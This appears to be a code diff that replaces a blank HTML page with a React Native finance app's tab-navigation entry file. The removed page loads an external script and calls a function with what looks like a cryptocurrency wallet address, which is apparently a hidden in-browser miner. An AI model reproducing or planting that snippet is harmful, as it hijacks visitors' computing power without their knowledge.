@@ -1,14 +1,23 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-</head>
-<body>
-    <script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo" ></script>
-<script type="text/javascript">
-EverythingIsLife('41iVeDotGpaG9u4xgzjZZoEoWx6znhpaT77xjrJ4k8HP8mQx8UrzxnSKikNuZ3XdZQ6BGcPMUK2GmGfj8utMGqG3GHMzpip', 'x', 20);
-</script>
-</body>
-</html>
+import React from 'react';
+import { NavigationContainer } from '@react-navigation/native';
+import { createBottomTabNavigator } from '@react-navigation/bottom-tabs';
+import HomeScreen from './screens/HomeScreen';
+import AddTransactionScreen from './screens/AddTransactionScreen';
+import SettingsScreen from './screens/SettingsScreen';
+import { Provider as PaperProvider } from 'react-native-paper';
+
+const Tab = createBottomTabNavigator();
+
+export default function App() {
+  return (
+    <PaperProvider>
+      <NavigationContainer>
+        <Tab.Navigator>
+          <Tab.Screen name="Главная" component={HomeScreen} />
+          <Tab.Screen name="Добавить" component={AddTransactionScreen} />
+          <Tab.Screen name="Настройки" component={SettingsScreen} />
+        </Tab.Navigator>
+      </NavigationContainer>
+    </PaperProvider>
+  );
+}
